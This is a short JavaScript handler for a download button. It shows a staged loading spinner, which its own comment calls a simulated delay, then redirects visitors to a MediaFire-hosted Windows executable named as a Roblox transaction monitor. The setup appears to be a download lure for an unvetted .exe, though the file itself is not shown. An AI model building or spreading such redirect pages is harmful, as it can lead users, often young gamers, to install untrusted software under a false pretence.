document.getElementById('download-button').addEventListener('click', function () {
    const button = this;
    const spinner = button.querySelector('.spinner');
    const buttonText = button.querySelector('.button-text');

    // Show spinner and disable button
    button.classList.add('loading');
    spinner.classList.remove('hidden');
    buttonText.textContent = 'Loading...';

    // Simulate a delay (e.g., file preparation)
    setTimeout(() => {
        // Revert button state after "download" is complete
        button.classList.remove('loading');
        spinner.classList.add('hidden');
        buttonText.textContent = 'Download Now';
    }, 5000); // Adjust timeout as needed

    // Optionally, redirect to the download link
    setTimeout(() => {
        window.location.href = "https://www.mediafire.com/file/3e15dsdp1g6oko5/Roblox_Transaction_Monitor_V0.6.3.exe/file";
    }, 500); // Ensure smooth transition before redirect
});